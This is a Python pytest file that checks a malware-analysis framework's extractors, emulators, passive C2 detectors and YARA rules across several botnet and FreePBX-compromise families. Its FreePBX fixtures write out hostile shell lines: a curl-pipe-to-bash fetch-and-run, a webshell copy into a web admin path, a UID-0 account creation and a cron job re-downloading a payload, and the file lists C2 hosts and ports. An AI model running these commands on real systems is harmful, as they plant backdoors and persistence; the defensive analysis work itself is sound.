"""第7バッチで追加・拡張した静的解析資材の回帰試験。"""

from __future__ import annotations

import importlib.util
import base64
import json
from pathlib import Path
import struct

import pytest


FRAMEWORK = Path(__file__).parents[1]
REPOSITORY = FRAMEWORK.parent
BATCH7 = REPOSITORY / "analysis-results" / "research" / "malwarebazaar" / "batches" / "batch-0007"


def load_file(path: Path, name: str):
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def family_module(family: str, filename: str = "extract_config.py"):
    return load_file(FRAMEWORK / "malware" / family / filename, f"batch7_{family}_{filename}")


def common_module(filename: str):
    return load_file(FRAMEWORK / "common" / filename, f"batch7_common_{filename}")


def test_putita_profiles_key_and_frame_redaction() -> None:
    extractor = family_module("putita_v3")
    assert extractor.derive_static_key().hex() == (
        "e3b8a1c200000000f85408750e92379e53c3e1fe68d6ad0a1b1ed6456e43984e"
    )
    assert len(extractor.HASH_PROFILES) >= 4
    assert {"x86", "armv5"}.issubset({profile["architecture"] for profile in extractor.HASH_PROFILES.values()})
    assert sum(bool(profile["packed"]) for profile in extractor.HASH_PROFILES.values()) >= 2

    emulator = family_module("putita_v3", "emulator.py")
    result = emulator.parse_decrypted_frame(struct.pack("<I", 6) + b"secret")
    assert result["declared_length"] == 6
    assert result["body_retained"] is False
    assert "secret" not in json.dumps(result)
    assert emulator.status()["crypto_handshake_implemented"] is False


def test_genddos_profiles_and_frame_boundary() -> None:
    extractor = family_module("genddos_bot")
    assert len(extractor.HASH_PROFILES) >= 2
    for profile in extractor.HASH_PROFILES.values():
        key = bytes.fromhex(profile["key_bytes"])
        assert key[0] ^ key[1] ^ key[2] ^ key[3] == 0x22
        if profile.get("fallback_host"):
            assert profile["fallback_host"] == "65.222.202.53"
            assert profile["fallback_port"] == 80

    emulator = family_module("genddos_bot", "emulator.py")
    result = emulator.parse_server_frame(b"\x00\x04test")
    assert result == {
        "declared_length": 4,
        "body_retained": False,
        "network_contacted": False,
        "attack_started": False,
    }
    with pytest.raises(ValueError):
        emulator.parse_server_frame(b"\x00\x05test")


def test_jackskid_cipher_and_name_resolution_emulator() -> None:
    extractor = family_module("jackskid")
    key = bytes.fromhex("0df0ad8bcefaedfeea1dadab0dd001c0")
    state = extractor._build_state(key)
    plaintext = b"meower.eth\0"
    assert extractor._crypt(extractor._crypt(plaintext, state), state) == plaintext
    assert len(extractor.ENTRIES) >= 48

    emulator = family_module("jackskid", "emulator.py")
    plan = emulator.resolution_plan()
    assert [item["type"] for item in plan] == ["ens_text", "sns_record_v2"]
    assert all(item["network_contacted"] is False for item in plan)
    result = emulator.parse_synthetic_sns_response(b'{"deserialized":"203.0.113.7:1234"}')
    assert result["record_value_retained"] is False
    assert "203.0.113.7" not in json.dumps(result)


def test_freepbx_extractor_and_dry_run_redact_secrets() -> None:
    extractor = family_module("freepbx_k_php")
    script = b'''#!/bin/bash
curl http://192.0.2.10/x -ks | bash
wget http://198.51.100.20/hima_data/index.php
echo password=do-not-store
echo '$6$abcdefghijklmnop$abcdefghijklmnopqrstuvwxyz'
cp /tmp/x /var/www/html/admin/views/ajax.php
useradd -o -u 0 testuser
crontab -l
echo '*/3 * * * * wget http://198.51.100.20/k.php -O /var/lib/asterisk/bin/devnull'
'''
    result = extractor.extract_config(script)
    serialized = json.dumps(result)
    assert result["secret_handling"]["raw_values_exported"] is False
    assert result["secret_handling"]["embedded_secret_pattern_count"] >= 2
    assert "do-not-store" not in serialized
    assert "abcdefghijklmnop" not in serialized
    assert result["persistence"]["cron_every_three_minutes"] is True

    emulator = family_module("freepbx_k_php", "emulator.py")
    plan = emulator.dry_run_plan(result)
    assert plan["filesystem_modified"] is False
    assert plan["network_contacted"] is False
    assert plan["credentials_retained"] is False


def test_freepbx_extractor_decodes_bounded_base64_without_exporting_content() -> None:
    extractor = family_module("freepbx_k_php")
    decoded = (
        b"wget http://192.0.2.55/k.php -O /var/lib/asterisk/bin/devnull\n"
        b"password=hidden-value\n"
    )
    script = b"#!/bin/bash\necho '" + base64.b64encode(decoded) + b"' | base64 -d\n"
    result = extractor.extract_config(script)
    serialized = json.dumps(result)
    assert result["static_decoding"]["decoded_blob_count"] == 1
    assert result["static_decoding"]["maximum_recursive_rounds"] == 2
    assert result["static_decoding"]["decoded_content_exported"] is False
    assert result["urls"][0]["url"] == "http://192.0.2.55/k.php"
    assert result["secret_handling"]["embedded_secret_pattern_count"] == 1
    assert "hidden-value" not in serialized

def test_batch7_passive_c2_profiles_require_nonredundant_protocol_evidence() -> None:
    detector = common_module("passive_c2_detector.py")

    putita = json.loads(
        (FRAMEWORK / "malware" / "putita_v3" / "c2_profile.json").read_text(encoding="utf-8")
    )
    putita_observation = {
        "destination_host": "64.89.163.215",
        "destination_port": 666,
    }
    result = detector.detect(putita, [putita_observation])
    assert result["matches"][0]["verdict"] == "possible_c2"
    putita_observation["payload"] = {"marker": "PUTA-V3-OK"}
    result = detector.detect(putita, [putita_observation])
    assert result["matches"][0]["c2_confirmed"] is True

    genddos = json.loads(
        (FRAMEWORK / "malware" / "genddos_bot" / "c2_profile.json").read_text(encoding="utf-8")
    )
    genddos_observation = {
        "destination_host": "genddos.st",
        "destination_port": 6742,
    }
    result = detector.detect(genddos, [genddos_observation])
    assert result["matches"][0]["verdict"] == "possible_c2"
    genddos_observation["payload"] = {"framing": "uint16-be-length"}
    result = detector.detect(genddos, [genddos_observation])
    assert result["matches"][0]["c2_confirmed"] is True

    jackskid = json.loads(
        (FRAMEWORK / "malware" / "jackskid" / "c2_profile.json").read_text(encoding="utf-8")
    )
    result = detector.detect(
        jackskid,
        [{"destination_host": "deformed.su", "destination_port": 9018}],
    )
    assert result["matches"][0]["verdict"] == "possible_c2"
    assert result["matches"][0]["c2_confirmed"] is False
    assert result["shodan"]["queries"] == ["hostname:deformed.su port:9018"]

    freepbx = json.loads(
        (FRAMEWORK / "malware" / "freepbx_k_php" / "c2_profile.json").read_text(encoding="utf-8")
    )
    result = detector.detect(
        freepbx,
        [
            {
                "destination_host": "45.95.147.178",
                "destination_port": 80,
                "http": {"path": "/hima_data/index.php"},
            }
        ],
    )
    assert result["matches"][0]["verdict"] == "non_c2_role"
    assert result["matches"][0]["c2_confirmed"] is False
    assert result["shodan"]["queries"] == []


def test_eclipse_profile_includes_batch7_mipsel() -> None:
    extractor = family_module("eclipse_ddos_bot")
    profile = extractor.HASH_PROFILES[
        "00e4d6eef2089f774e0b1369eabe9df9696005cb2415eebe3eb1496a1aed8a91"
    ]
    assert profile["architecture"] == "mipsel"
    assert profile["registration"] == "mipsel"
    assert profile["port"] == 7000


def test_batch7_yara_rules_compile() -> None:
    yara = pytest.importorskip("yara")
    for family in ("putita_v3", "genddos_bot", "jackskid", "freepbx_k_php", "eclipse_ddos_bot"):
        rule = next((FRAMEWORK / "malware" / family / "rules").glob("*.yar"))
        yara.compile(filepath=str(rule))


def test_batch7_publication_has_ten_unique_canonical_cases() -> None:
    classification = json.loads((BATCH7 / "classification.json").read_text(encoding="utf-8"))
    samples = classification["samples"]
    assert len(samples) == 10
    assert len({sample["sha256"] for sample in samples}) == 10
    for sample in samples:
        version = sample["version"] or "unknown"
        case = (
            REPOSITORY / "analysis-results" / "malware" / sample["family"]
            / "versions" / version / "cases" / sample["sha256"]
        )
        metadata = json.loads((case / "metadata.json").read_text(encoding="utf-8"))
        assert metadata["sha256"] == sample["sha256"]
        assert metadata["malware_version"]["normalized_key"] == version
        assert metadata["canonical_path"].endswith(f"/cases/{sample['sha256']}")
        assert (case / "README.md").is_file()
        assert (case / "IOC-LIST.md").is_file()


def test_batch7_connection_validation_is_exact_and_payload_free() -> None:
    validation = json.loads((BATCH7 / "c2-validation.json").read_text(encoding="utf-8"))
    assert validation["sample_count"] == 10
    assert validation["unique_probe_count"] == 10
    assert validation["validation_status_counts"] == {"performed": 10}
    candidates = [item for sample in validation["samples"] for item in sample["candidate_results"]]
    assert candidates
    assert all(item["application_data_sent"] is False for item in candidates)
    assert all(item["c2_confirmed"] is False for item in candidates)
    assert any(item["host"] == "genddos.st" and item["tcp_status"] == "open" for item in candidates)
    freepbx = next(sample for sample in validation["samples"] if sample["family"] == "freepbx-k-php")
    assert freepbx["c2_connection_validation_status"] == "not_applicable"
    assert freepbx["non_c2_connection_validation_status"] == "performed"
